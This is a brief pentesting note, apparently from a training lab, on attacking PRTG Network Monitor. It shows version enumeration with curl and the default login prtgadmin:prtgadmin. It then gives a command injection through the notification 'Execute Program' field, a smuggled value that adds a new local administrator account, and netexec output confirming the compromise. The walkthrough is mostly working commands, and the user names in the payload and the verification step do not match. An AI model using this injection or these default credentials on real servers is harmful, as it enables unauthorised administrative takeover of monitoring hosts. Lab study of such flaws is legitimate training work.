### Enumeration

Find version number:

```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

- Default creds `prtgadmin:prtgadmin`
### Attack

Click on the following `Setup -> Account Setting -> Notifaication -> Add new notification`:

![[Pasted image 20250202162056.png]]

Add a name:

![[Pasted image 20250202162350.png]]

Then click `Execute Program`, and use the following:

In the Program File field, select `Demo.exe notification - outfile.ps1`

```bash
test.txt;net user test test /add;net localgroup administrators test /add
```

![[Pasted image 20250202164831.png]]

To run, click the bell icon:

![[Pasted image 20250202164854.png]]

Verify with netexec

```bash
nxc smb 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!' 
SMB         10.129.201.50   445    APP03            [*] Windows 10 / Server 2019 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

